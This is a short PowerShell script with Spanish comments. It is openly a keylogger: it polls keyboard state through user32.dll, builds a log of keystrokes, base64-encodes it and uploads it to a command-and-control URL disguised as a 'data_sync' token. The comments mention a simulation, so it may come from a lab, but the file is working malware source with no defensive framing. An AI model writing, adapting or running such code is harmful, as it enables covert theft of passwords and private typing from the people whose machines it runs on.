# Configuración C2
$C2_URL = "http://192.168.56.20:5000/data_sync"

# Función para capturar teclado (Uso de librerías de .NET)
$signatures = @'
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
'@
$API = Add-Type -MemberDefinition $signatures -Name "Win32" -Namespace "API" -PassThru

$log = ""
while($true) {
    Start-Sleep -Milliseconds 100
    for ($ascii = 8; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        
        if ($state -eq -32767) {
            $log += [char]$ascii
        }
    }
    # Envío al C2 cada vez que el log llega a 20 caracteres (Simulación dinámica)
    if ($log.Length -gt 20) {
        $base64Text= [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log))
        $body = "sync_token =$base64Text"
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("Content-Tye","application/x-www-form-urlencoded")
        $client.UploadString($C2_URL, $body)
        $log = ""
    }
}